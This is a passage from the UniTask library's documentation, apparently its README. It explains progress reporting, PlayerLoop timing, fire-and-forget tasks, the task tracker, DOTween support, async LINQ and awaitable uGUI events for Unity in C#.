&lt;code&gt;.Timeout&lt;/code&gt; work from external of task, can not stop timeoutted task. &lt;code&gt;.Timeout&lt;/code&gt; means ignore result when timeout. If you pass a &lt;code&gt;CancellationToken&lt;/code&gt; to the method, it will act from inside of the task, so it is possible to stop a running task.&lt;/p&gt; &#xA;&lt;h2&gt;Progress&lt;/h2&gt; &#xA;&lt;p&gt;Some async operations for unity have &lt;code&gt;ToUniTask(IProgress&amp;lt;float&amp;gt; progress = null, ...)&lt;/code&gt; extension methods.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;var progress = Progress.Create&amp;lt;float&amp;gt;(x =&amp;gt; Debug.Log(x));&#xA;&#xA;var request = await UnityWebRequest.Get(&#34;http://google.co.jp&#34;)&#xA;    .SendWebRequest()&#xA;    .ToUniTask(progress: progress);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You should not use standard &lt;code&gt;new System.Progress&amp;lt;T&amp;gt;&lt;/code&gt;, because it causes allocation every time. Use &lt;code&gt;Cysharp.Threading.Tasks.Progress&lt;/code&gt; instead. This progress factory has two methods, &lt;code&gt;Create&lt;/code&gt; and &lt;code&gt;CreateOnlyValueChanged&lt;/code&gt;. &lt;code&gt;CreateOnlyValueChanged&lt;/code&gt; calls only when the progress value has changed.&lt;/p&gt; &#xA;&lt;p&gt;Implementing IProgress interface to caller is better as there is no lambda allocation.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;public class Foo : MonoBehaviour, IProgress&amp;lt;float&amp;gt;&#xA;{&#xA;    public void Report(float value)&#xA;    {&#xA;        UnityEngine.Debug.Log(value);&#xA;    }&#xA;&#xA;    public async UniTaskVoid WebRequest()&#xA;    {&#xA;        var request = await UnityWebRequest.Get(&#34;http://google.co.jp&#34;)&#xA;            .SendWebRequest()&#xA;            .ToUniTask(progress: this); // pass this&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;PlayerLoop&lt;/h2&gt; &#xA;&lt;p&gt;UniTask is run on a custom &lt;a href=&#34;https://docs.unity3d.com/ScriptReference/LowLevel.PlayerLoop.html&#34;&gt;PlayerLoop&lt;/a&gt;. UniTask&#39;s playerloop based methods (such as &lt;code&gt;Delay&lt;/code&gt;, &lt;code&gt;DelayFrame&lt;/code&gt;, &lt;code&gt;asyncOperation.ToUniTask&lt;/code&gt;, etc...) accept this &lt;code&gt;PlayerLoopTiming&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;public enum PlayerLoopTiming&#xA;{&#xA;    Initialization = 0,&#xA;    LastInitialization = 1,&#xA;&#xA;    EarlyUpdate = 2,&#xA;    LastEarlyUpdate = 3,&#xA;&#xA;    FixedUpdate = 4,&#xA;    LastFixedUpdate = 5,&#xA;&#xA;    PreUpdate = 6,&#xA;    LastPreUpdate = 7,&#xA;&#xA;    Update = 8,&#xA;    LastUpdate = 9,&#xA;&#xA;    PreLateUpdate = 10,&#xA;    LastPreLateUpdate = 11,&#xA;&#xA;    PostLateUpdate = 12,&#xA;    LastPostLateUpdate = 13&#xA;    &#xA;#if UNITY_2020_2_OR_NEWER&#xA;    TimeUpdate = 14,&#xA;    LastTimeUpdate = 15,&#xA;#endif&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It indicates when to run, you can check &lt;a href=&#34;https://gist.github.com/neuecc/bc3a1cfd4d74501ad057e49efcd7bdae&#34;&gt;PlayerLoopList.md&lt;/a&gt; to Unity&#39;s default playerloop and injected UniTask&#39;s custom loop.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;PlayerLoopTiming.Update&lt;/code&gt; is similar to &lt;code&gt;yield return null&lt;/code&gt; in a coroutine, but it is called before Update(Update and uGUI events(button.onClick, etc...) are called on &lt;code&gt;ScriptRunBehaviourUpdate&lt;/code&gt;, yield return null is called on &lt;code&gt;ScriptRunDelayedDynamicFrameRate&lt;/code&gt;). &lt;code&gt;PlayerLoopTiming.FixedUpdate&lt;/code&gt; is similar to &lt;code&gt;WaitForFixedUpdate&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;code&gt;PlayerLoopTiming.LastPostLateUpdate&lt;/code&gt; is not equivalent to coroutine&#39;s &lt;code&gt;yield return new WaitForEndOfFrame()&lt;/code&gt;. Coroutine&#39;s WaitForEndOfFrame seems to run after the PlayerLoop is done. Some methods that require coroutine&#39;s end of frame(&lt;code&gt;Texture2D.ReadPixels&lt;/code&gt;, &lt;code&gt;ScreenCapture.CaptureScreenshotAsTexture&lt;/code&gt;, &lt;code&gt;CommandBuffer&lt;/code&gt;, etc) do not work correctly when replaced with async/await. In these cases, pass MonoBehaviour(coroutine runnner) to &lt;code&gt;UniTask.WaitForEndOfFrame&lt;/code&gt;. For example, &lt;code&gt;await UniTask.WaitForEndOfFrame(this);&lt;/code&gt; is lightweight allocation free alternative of &lt;code&gt;yield return new WaitForEndOfFrame()&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;code&gt;yield return null&lt;/code&gt; and &lt;code&gt;UniTask.Yield&lt;/code&gt; are similar but different. &lt;code&gt;yield return null&lt;/code&gt; always returns next frame but &lt;code&gt;UniTask.Yield&lt;/code&gt; returns next called. That is, call &lt;code&gt;UniTask.Yield(PlayerLoopTiming.Update)&lt;/code&gt; on &lt;code&gt;PreUpdate&lt;/code&gt;, it returns same frame. &lt;code&gt;UniTask.NextFrame()&lt;/code&gt; guarantees return next frame, you can expect this to behave exactly the same as &lt;code&gt;yield return null&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;UniTask.Yield(without CancellationToken) is a special type, returns &lt;code&gt;YieldAwaitable&lt;/code&gt; and runs on YieldRunner. It is the most lightweight and fastest.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;code&gt;AsyncOperation&lt;/code&gt; is returned from native timing. For example, await &lt;code&gt;SceneManager.LoadSceneAsync&lt;/code&gt; is returned from &lt;code&gt;EarlyUpdate.UpdatePreloading&lt;/code&gt; and after being called, the loaded scene&#39;s &lt;code&gt;Start&lt;/code&gt; is called from &lt;code&gt;EarlyUpdate.ScriptRunDelayedStartupFrame&lt;/code&gt;. Also &lt;code&gt;await UnityWebRequest&lt;/code&gt; is returned from &lt;code&gt;EarlyUpdate.ExecuteMainThreadJobs&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;In UniTask, await directly uses native timing, while &lt;code&gt;WithCancellation&lt;/code&gt; and &lt;code&gt;ToUniTask&lt;/code&gt; use specified timing. This is usually not a particular problem, but with &lt;code&gt;LoadSceneAsync&lt;/code&gt;, it causes a different order of Start and continuation after await. So it is recommended not to use &lt;code&gt;LoadSceneAsync.ToUniTask&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;In the stacktrace, you can check where it is running in playerloop.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/46207/83735571-83caea80-a68b-11ea-8d22-5e22864f0d24.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;By default, UniTask&#39;s PlayerLoop is initialized at &lt;code&gt;[RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.BeforeSceneLoad)]&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The order in which methods are called in BeforeSceneLoad is nondeterministic, so if you want to use UniTask in other BeforeSceneLoad methods, you should try to initialize it before this.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;// AfterAssembliesLoaded is called before BeforeSceneLoad&#xA;[RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.AfterAssembliesLoaded)]&#xA;public static void InitUniTaskLoop()&#xA;{&#xA;    var loop = PlayerLoop.GetCurrentPlayerLoop();&#xA;    Cysharp.Threading.Tasks.PlayerLoopHelper.Initialize(ref loop);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you import Unity&#39;s &lt;code&gt;Entities&lt;/code&gt; package, that resets the custom player loop to default at &lt;code&gt;BeforeSceneLoad&lt;/code&gt; and injects ECS&#39;s loop. When Unity calls ECS&#39;s inject method after UniTask&#39;s initialize method, UniTask will no longer work.&lt;/p&gt; &#xA;&lt;p&gt;To solve this issue, you can re-initialize the UniTask PlayerLoop after ECS is initialized.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;// Get ECS Loop.&#xA;var playerLoop = ScriptBehaviourUpdateOrder.CurrentPlayerLoop;&#xA;&#xA;// Setup UniTask&#39;s PlayerLoop.&#xA;PlayerLoopHelper.Initialize(ref playerLoop);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can diagnose whether UniTask&#39;s player loop is ready by calling &lt;code&gt;PlayerLoopHelper.IsInjectedUniTaskPlayerLoop()&lt;/code&gt;. And also &lt;code&gt;PlayerLoopHelper.DumpCurrentPlayerLoop&lt;/code&gt; logs all current playerloops to console.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;void Start()&#xA;{&#xA;    UnityEngine.Debug.Log(&#34;UniTaskPlayerLoop ready? &#34; + PlayerLoopHelper.IsInjectedUniTaskPlayerLoop());&#xA;    PlayerLoopHelper.DumpCurrentPlayerLoop();&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can optimize loop cost slightly by remove unuse PlayerLoopTiming injection. You can call &lt;code&gt;PlayerLoopHelper.Initialize(InjectPlayerLoopTimings)&lt;/code&gt; on initialize.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;var loop = PlayerLoop.GetCurrentPlayerLoop();&#xA;PlayerLoopHelper.Initialize(ref loop, InjectPlayerLoopTimings.Minimum); // minimum is Update | FixedUpdate | LastPostLateUpdate&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;InjectPlayerLoopTimings&lt;/code&gt; has three preset, &lt;code&gt;All&lt;/code&gt; and &lt;code&gt;Standard&lt;/code&gt;(All without last except LastPostLateUpdate), &lt;code&gt;Minimum&lt;/code&gt;(&lt;code&gt;Update | FixedUpdate | LastPostLateUpdate&lt;/code&gt;). Default is All and you can combine custom inject timings like &lt;code&gt;InjectPlayerLoopTimings.Update | InjectPlayerLoopTimings.FixedUpdate | InjectPlayerLoopTimings.PreLateUpdate&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You can make error to use uninjected &lt;code&gt;PlayerLoopTiming&lt;/code&gt; by &lt;a href=&#34;https://github.com/dotnet/roslyn-analyzers/raw/master/src/Microsoft.CodeAnalysis.BannedApiAnalyzers/BannedApiAnalyzers.Help.md&#34;&gt;Microsoft.CodeAnalysis.BannedApiAnalyzers&lt;/a&gt;. For example, you can setup &lt;code&gt;BannedSymbols.txt&lt;/code&gt; like this for &lt;code&gt;InjectPlayerLoopTimings.Minimum&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;F:Cysharp.Threading.Tasks.PlayerLoopTiming.Initialization; Isn&#39;t injected this PlayerLoop in this project.&#xA;F:Cysharp.Threading.Tasks.PlayerLoopTiming.LastInitialization; Isn&#39;t injected this PlayerLoop in this project.&#xA;F:Cysharp.Threading.Tasks.PlayerLoopTiming.EarlyUpdate; Isn&#39;t injected this PlayerLoop in this project.&#xA;F:Cysharp.Threading.Tasks.PlayerLoopTiming.LastEarlyUpdate; Isn&#39;t injected this PlayerLoop in this project.d&#xA;F:Cysharp.Threading.Tasks.PlayerLoopTiming.LastFixedUpdate; Isn&#39;t injected this PlayerLoop in this project.&#xA;F:Cysharp.Threading.Tasks.PlayerLoopTiming.PreUpdate; Isn&#39;t injected this PlayerLoop in this project.&#xA;F:Cysharp.Threading.Tasks.PlayerLoopTiming.LastPreUpdate; Isn&#39;t injected this PlayerLoop in this project.&#xA;F:Cysharp.Threading.Tasks.PlayerLoopTiming.LastUpdate; Isn&#39;t injected this PlayerLoop in this project.&#xA;F:Cysharp.Threading.Tasks.PlayerLoopTiming.PreLateUpdate; Isn&#39;t injected this PlayerLoop in this project.&#xA;F:Cysharp.Threading.Tasks.PlayerLoopTiming.LastPreLateUpdate; Isn&#39;t injected this PlayerLoop in this project.&#xA;F:Cysharp.Threading.Tasks.PlayerLoopTiming.PostLateUpdate; Isn&#39;t injected this PlayerLoop in this project.&#xA;F:Cysharp.Threading.Tasks.PlayerLoopTiming.TimeUpdate; Isn&#39;t injected this PlayerLoop in this project.&#xA;F:Cysharp.Threading.Tasks.PlayerLoopTiming.LastTimeUpdate; Isn&#39;t injected this PlayerLoop in this project.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can configure &lt;code&gt;RS0030&lt;/code&gt; severity to error.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/46207/109150837-bb933880-77ac-11eb-85ba-4fd15819dbd0.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;async void vs async UniTaskVoid&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;async void&lt;/code&gt; is a standard C# task system so it does not run on UniTask systems. It is better not to use it. &lt;code&gt;async UniTaskVoid&lt;/code&gt; is a lightweight version of &lt;code&gt;async UniTask&lt;/code&gt; because it does not have awaitable completion and reports errors immediately to &lt;code&gt;UniTaskScheduler.UnobservedTaskException&lt;/code&gt;. If you don&#39;t require awaiting (fire and forget), using &lt;code&gt;UniTaskVoid&lt;/code&gt; is better. Unfortunately to dismiss warning, you&#39;re required to call &lt;code&gt;Forget()&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;public async UniTaskVoid FireAndForgetMethod()&#xA;{&#xA;    // do anything...&#xA;    await UniTask.Yield();&#xA;}&#xA;&#xA;public void Caller()&#xA;{&#xA;    FireAndForgetMethod().Forget();&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Also UniTask has the &lt;code&gt;Forget&lt;/code&gt; method, it is similar to &lt;code&gt;UniTaskVoid&lt;/code&gt; and has the same effects. However &lt;code&gt;UniTaskVoid&lt;/code&gt; is more efficient if you completely don&#39;t use &lt;code&gt;await&lt;/code&gt;。&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;public async UniTask DoAsync()&#xA;{&#xA;    // do anything...&#xA;    await UniTask.Yield();&#xA;}&#xA;&#xA;public void Caller()&#xA;{&#xA;    DoAsync().Forget();&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To use an async lambda registered to an event, don&#39;t use &lt;code&gt;async void&lt;/code&gt;. Instead you can use &lt;code&gt;UniTask.Action&lt;/code&gt; or &lt;code&gt;UniTask.UnityAction&lt;/code&gt;, both of which create a delegate via &lt;code&gt;async UniTaskVoid&lt;/code&gt; lambda.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;Action actEvent;&#xA;UnityAction unityEvent; // especially used in uGUI&#xA;&#xA;// Bad: async void&#xA;actEvent += async () =&amp;gt; { };&#xA;unityEvent += async () =&amp;gt; { };&#xA;&#xA;// Ok: create Action delegate by lambda&#xA;actEvent += UniTask.Action(async () =&amp;gt; { await UniTask.Yield(); });&#xA;unityEvent += UniTask.UnityAction(async () =&amp;gt; { await UniTask.Yield(); });&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;UniTaskVoid&lt;/code&gt; can also be used in MonoBehaviour&#39;s &lt;code&gt;Start&lt;/code&gt; method.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;class Sample : MonoBehaviour&#xA;{&#xA;    async UniTaskVoid Start()&#xA;    {&#xA;        // async init code.&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;UniTaskTracker&lt;/h2&gt; &#xA;&lt;p&gt;useful for checking (leaked) UniTasks. You can open tracker window in &lt;code&gt;Window -&amp;gt; UniTask Tracker&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/46207/83527073-4434bf00-a522-11ea-86e9-3b3975b26266.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Enable AutoReload(Toggle) - Reload automatically.&lt;/li&gt; &#xA; &lt;li&gt;Reload - Reload view.&lt;/li&gt; &#xA; &lt;li&gt;GC.Collect - Invoke GC.Collect.&lt;/li&gt; &#xA; &lt;li&gt;Enable Tracking(Toggle) - Start to track async/await UniTask. Performance impact: low.&lt;/li&gt; &#xA; &lt;li&gt;Enable StackTrace(Toggle) - Capture StackTrace when task is started. Performance impact: high.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;UniTaskTracker is intended for debugging use only as enabling tracking and capturing stacktraces is useful but has a heavy performance impact. Recommended usage is to enable both tracking and stacktraces to find task leaks and to disable them both when done.&lt;/p&gt; &#xA;&lt;h2&gt;External Assets&lt;/h2&gt; &#xA;&lt;p&gt;By default, UniTask supports TextMeshPro(&lt;code&gt;BindTo(TMP_Text)&lt;/code&gt; and &lt;code&gt;TMP_InputField&lt;/code&gt; event extensions like standard uGUI &lt;code&gt;InputField&lt;/code&gt;), DOTween(&lt;code&gt;Tween&lt;/code&gt; as awaitable) and Addressables(&lt;code&gt;AsyncOperationHandle&lt;/code&gt; and &lt;code&gt;AsyncOperationHandle&amp;lt;T&amp;gt;&lt;/code&gt; as awaitable).&lt;/p&gt; &#xA;&lt;p&gt;There are defined in separated asmdefs like &lt;code&gt;UniTask.TextMeshPro&lt;/code&gt;, &lt;code&gt;UniTask.DOTween&lt;/code&gt;, &lt;code&gt;UniTask.Addressables&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;TextMeshPro and Addressables support are automatically enabled when importing their packages from package manager. However for DOTween support, it is required to import &lt;code&gt;com.demigiant.dotween&lt;/code&gt; from &lt;a href=&#34;https://openupm.com/packages/com.demigiant.dotween/&#34;&gt;OpenUPM&lt;/a&gt; or to define &lt;code&gt;UNITASK_DOTWEEN_SUPPORT&lt;/code&gt; to enable it.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;// sequential&#xA;await transform.DOMoveX(2, 10);&#xA;await transform.DOMoveZ(5, 20);&#xA;&#xA;// parallel with cancellation&#xA;var ct = this.GetCancellationTokenOnDestroy();&#xA;&#xA;await UniTask.WhenAll(&#xA;    transform.DOMoveX(10, 3).WithCancellation(ct),&#xA;    transform.DOScale(10, 3).WithCancellation(ct));&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;DOTween support&#39;s default behaviour(&lt;code&gt;await&lt;/code&gt;, &lt;code&gt;WithCancellation&lt;/code&gt;, &lt;code&gt;ToUniTask&lt;/code&gt;) awaits tween is killed. It works on both Complete(true/false) and Kill(true/false). But if you want to reuse tweens (&lt;code&gt;SetAutoKill(false)&lt;/code&gt;), it does not work as expected. If you want to await for another timing, the following extension methods exist in Tween, &lt;code&gt;AwaitForComplete&lt;/code&gt;, &lt;code&gt;AwaitForPause&lt;/code&gt;, &lt;code&gt;AwaitForPlay&lt;/code&gt;, &lt;code&gt;AwaitForRewind&lt;/code&gt;, &lt;code&gt;AwaitForStepComplete&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;AsyncEnumerable and Async LINQ&lt;/h2&gt; &#xA;&lt;p&gt;Unity 2020.2 supports C# 8.0 so you can use &lt;code&gt;await foreach&lt;/code&gt;. This is the new Update notation in the async era.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;// Unity 2020.2, C# 8.0&#xA;await foreach (var _ in UniTaskAsyncEnumerable.EveryUpdate(token))&#xA;{&#xA;    Debug.Log(&#34;Update() &#34; + Time.frameCount);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In a C# 7.3 environment, you can use the &lt;code&gt;ForEachAsync&lt;/code&gt; method to work in almost the same way.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;// C# 7.3(Unity 2018.3~)&#xA;await UniTaskAsyncEnumerable.EveryUpdate(token).ForEachAsync(_ =&amp;gt;&#xA;{&#xA;    Debug.Log(&#34;Update() &#34; + Time.frameCount);&#xA;});&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;UniTaskAsyncEnumerable implements asynchronous LINQ, similar to LINQ in &lt;code&gt;IEnumerable&amp;lt;T&amp;gt;&lt;/code&gt; or Rx in &lt;code&gt;IObservable&amp;lt;T&amp;gt;&lt;/code&gt;. All standard LINQ query operators can be applied to asynchronous streams. For example, the following code shows how to apply a Where filter to a button-click asynchronous stream that runs once every two clicks.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;await okButton.OnClickAsAsyncEnumerable().Where((x, i) =&amp;gt; i % 2 == 0).ForEachAsync(_ =&amp;gt;&#xA;{&#xA;});&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Fire and Forget style(for example, event handling), you can also use &lt;code&gt;Subscribe&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;okButton.OnClickAsAsyncEnumerable().Where((x, i) =&amp;gt; i % 2 == 0).Subscribe(_ =&amp;gt;&#xA;{&#xA;});&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Async LINQ is enabled when &lt;code&gt;using Cysharp.Threading.Tasks.Linq;&lt;/code&gt;, and &lt;code&gt;UniTaskAsyncEnumerable&lt;/code&gt; is defined in &lt;code&gt;UniTask.Linq&lt;/code&gt; asmdef.&lt;/p&gt; &#xA;&lt;p&gt;It&#39;s closer to UniRx (Reactive Extensions), but UniTaskAsyncEnumerable is a pull-based asynchronous stream, whereas Rx was a push-based asynchronous stream. Note that although similar, the characteristics are different and the details behave differently along with them.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;UniTaskAsyncEnumerable&lt;/code&gt; is the entry point like &lt;code&gt;Enumerable&lt;/code&gt;. In addition to the standard query operators, there are other generators for Unity such as &lt;code&gt;EveryUpdate&lt;/code&gt;, &lt;code&gt;Timer&lt;/code&gt;, &lt;code&gt;TimerFrame&lt;/code&gt;, &lt;code&gt;Interval&lt;/code&gt;, &lt;code&gt;IntervalFrame&lt;/code&gt;, and &lt;code&gt;EveryValueChanged&lt;/code&gt;. And also added additional UniTask original query operators like &lt;code&gt;Append&lt;/code&gt;, &lt;code&gt;Prepend&lt;/code&gt;, &lt;code&gt;DistinctUntilChanged&lt;/code&gt;, &lt;code&gt;ToHashSet&lt;/code&gt;, &lt;code&gt;Buffer&lt;/code&gt;, &lt;code&gt;CombineLatest&lt;/code&gt;, &lt;code&gt;Do&lt;/code&gt;, &lt;code&gt;Never&lt;/code&gt;, &lt;code&gt;ForEachAsync&lt;/code&gt;, &lt;code&gt;Pairwise&lt;/code&gt;, &lt;code&gt;Publish&lt;/code&gt;, &lt;code&gt;Queue&lt;/code&gt;, &lt;code&gt;Return&lt;/code&gt;, &lt;code&gt;SkipUntil&lt;/code&gt;, &lt;code&gt;TakeUntil&lt;/code&gt;, &lt;code&gt;SkipUntilCanceled&lt;/code&gt;, &lt;code&gt;TakeUntilCanceled&lt;/code&gt;, &lt;code&gt;TakeLast&lt;/code&gt;, &lt;code&gt;Subscribe&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The method with Func as an argument has three additional overloads, &lt;code&gt;***Await&lt;/code&gt;, &lt;code&gt;***AwaitWithCancellation&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;Select(Func&amp;lt;T, TR&amp;gt; selector)&#xA;SelectAwait(Func&amp;lt;T, UniTask&amp;lt;TR&amp;gt;&amp;gt; selector)&#xA;SelectAwaitWithCancellation(Func&amp;lt;T, CancellationToken, UniTask&amp;lt;TR&amp;gt;&amp;gt; selector)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want to use the &lt;code&gt;async&lt;/code&gt; method inside the func, use the &lt;code&gt;***Await&lt;/code&gt; or &lt;code&gt;***AwaitWithCancellation&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;How to create an async iterator: C# 8.0 supports async iterator(&lt;code&gt;async yield return&lt;/code&gt;) but it only allows &lt;code&gt;IAsyncEnumerable&amp;lt;T&amp;gt;&lt;/code&gt; and of course requires C# 8.0. UniTask supports &lt;code&gt;UniTaskAsyncEnumerable.Create&lt;/code&gt; method to create custom async iterator.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;// IAsyncEnumerable, C# 8.0 version of async iterator. ( do not use this style, IAsyncEnumerable is not controled in UniTask).&#xA;public async IAsyncEnumerable&amp;lt;int&amp;gt; MyEveryUpdate([EnumeratorCancellation]CancellationToken cancelationToken = default)&#xA;{&#xA;    var frameCount = 0;&#xA;    await UniTask.Yield();&#xA;    while (!token.IsCancellationRequested)&#xA;    {&#xA;        yield return frameCount++;&#xA;        await UniTask.Yield();&#xA;    }&#xA;}&#xA;&#xA;// UniTaskAsyncEnumerable.Create and use `await writer.YieldAsync` instead of `yield return`.&#xA;public IUniTaskAsyncEnumerable&amp;lt;int&amp;gt; MyEveryUpdate()&#xA;{&#xA;    // writer(IAsyncWriter&amp;lt;T&amp;gt;) has `YieldAsync(value)` method.&#xA;    return UniTaskAsyncEnumerable.Create&amp;lt;int&amp;gt;(async (writer, token) =&amp;gt;&#xA;    {&#xA;        var frameCount = 0;&#xA;        await UniTask.Yield();&#xA;        while (!token.IsCancellationRequested)&#xA;        {&#xA;            await writer.YieldAsync(frameCount++); // instead of `yield return`&#xA;            await UniTask.Yield();&#xA;        }&#xA;    });&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Awaitable Events&lt;/h2&gt; &#xA;&lt;p&gt;All uGUI component implements &lt;code&gt;***AsAsyncEnumerable&lt;/code&gt; to convert asynchronous streams of events.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;async UniTask TripleClick()&#xA;{&#xA;    // In default, used button.GetCancellationTokenOnDestroy to manage lieftime of async&#xA;    await button.OnClickAsync();&#xA;    await button.OnClickAsync();&#xA;    await button.OnClickAsync();&#xA;    Debug.Log(&#34;Three times clicked&#34;);&#xA;}&#xA;&#xA;// more efficient way&#xA;async UniTask TripleClick()&#xA;{&#xA;    using (var handler = button.GetAsyncClickEventHandler())&#xA;    {&#xA;        await handler.OnClickAsync();&#xA;        await handler.OnClickAsync();&#xA;        await handler.OnClickAsync();&#xA;        Debug.Log(&#34;Three times clicked&#34;);&#xA;    }&#xA;}&#xA;&#xA;// use async LINQ&#xA;async UniTask TripleClick(CancellationToken token)&#xA;{&#xA;    await button.OnClickAsAsyncEnumerable().Take(3).Last();&#xA;    Debug.Log(&#34;Three times clicked&#34;);&#xA;}&#xA;&#xA;// use async LINQ2&#xA;async UniTask TripleClick(CancellationToken token)&#xA;{&#xA;    await button.OnClickAsAsyncEnumerable().Take(3).ForEachAsync(_ =&amp;gt;&#xA;    {&#xA;        Debug.Log(&#34;Every clicked&#34;);&#xA;    });&#xA;    Debug.Log(&#34;Three times clicked, complete.&#34;);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;All MonoBehaviour message events can convert async-streams by &lt;code&gt;AsyncTriggers&lt;/code&gt; that can be enabled by &lt;code&gt;using Cysharp.Threading.Tasks.Triggers;&lt;/code&gt;. AsyncTrigger can be created using &lt;code&gt;GetAsync***Trigger&lt;/code&gt; and triggers itself as UniTaskAsyncEnumerable.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;var trigger = this.GetOnCollisionEnterAsyncHandler();&#xA;await trigger.OnCollisionEnterAsync();&#xA;await trigger.OnCollisionEnterAsync();&#xA;await trigger.OnCollisionEnterAsync();&#xA;&#xA;// every moves.&#xA;await this.GetAsyncMoveTrigger().ForEachAsync(axisEventData =&amp;gt;&#xA;{&#xA;});&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;AsyncReactiveProperty&lt;/code&gt;, &lt;code&gt;AsyncReadOnlyReactiveProperty&lt;/code&gt; is UniTask&#39;s version of ReactiveProperty. &lt;code&gt;BindTo&lt;/code&gt; extension method of &lt;code&gt;IUniTaskAsyncEnumerable&amp;lt;T&amp;gt;&lt;/code&gt; for binding asynchronous stream values to Unity components(Text/Selectable/TMP/Text).&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;var rp = new AsyncReactiveProperty&amp;lt;int&amp;gt;(99);&#xA;&#xA;// AsyncReactiveProperty itself is IUniTaskAsyncEnumerable, you can query by LINQ&#xA;rp.ForEachAsync(x =&amp;gt;&#xA;{&#xA;    Debug.Log(x);&#xA;}, 